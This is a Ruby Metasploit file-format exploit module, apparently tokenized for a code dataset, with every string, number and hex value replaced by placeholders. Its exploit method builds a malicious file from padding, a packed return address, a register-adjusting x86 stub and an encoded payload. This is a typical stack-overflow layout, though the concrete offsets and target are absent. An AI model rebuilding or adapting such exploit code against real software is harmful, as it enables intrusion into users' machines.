require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: FILEFORMAT def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> , ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > Rex :: Text . charset_exclude ( Rex :: Text :: AlphaNumeric ) , <str> = > true , <str> = > { <str> = > <str> } } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , } ] , ] , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def exploit content = <str> content << <str> content << <str> content << <str> content << <str> content << <str> content << rand_text_alpha ( target [ <str> ] - <str> . length ) content << [ target . ret ] . pack ( <str> ) content << <str> content << [ target [ <str> ] ] . pack ( <str> ) content << rand_text_alpha ( <hex> ) content << <str> content << <str> content << Rex :: Arch :: X86 . sub ( - ( target [ <str> ] ) , Rex :: Arch :: X86 :: ECX , <str> , false , true ) content << <str> content << payload . encoded content << <str> content << <str> content << <str> content << <str> content << <str> print_status ( <str> datastore [ <str> ] <str> ) file_create ( content ) end end 
